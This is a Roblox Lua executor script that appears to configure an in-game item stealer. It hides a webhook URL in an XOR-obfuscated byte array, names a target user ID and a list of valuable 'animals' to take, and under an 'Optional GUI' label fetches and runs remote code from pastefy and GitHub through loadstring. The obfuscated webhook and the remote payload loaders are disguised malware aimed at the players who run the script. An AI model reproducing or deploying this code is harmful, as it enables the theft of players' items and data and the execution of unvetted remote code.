local genv = getgenv()

genv.GOOD_WEBHOOK = (function() local b={69,89,89,93,94,23,2,2,73,68,94,78,66,95,73,3,78,66,64,2,76,93,68,2,90,72,79,69,66,66,70,94,2,28,24,25,31,26,28,26,24,24,30,20,25,31,25,27,31,24,26,25,2,97,28,26,95,31,99,126,89,25,99,111,92,68,24,114,89,96,64,100,25,116,74,105,99,69,84,24,89,111,103,30,99,68,31,101,30,64,28,26,101,29,104,107,99,69,69,120,67,125,90,89,126,125,97,73,67,122,97,72,68,67,89,87,65,96,98,29,99} local k=45 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()

genv.TARGET_USER_ID = 10279786442

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "La Breakfast Combinasion",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "La Fuse Machine",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Yetimatic",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung"
}

genv.ALLOWED_BASESKINS = {

}

genv.ALLOWED_GEARS = {

}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
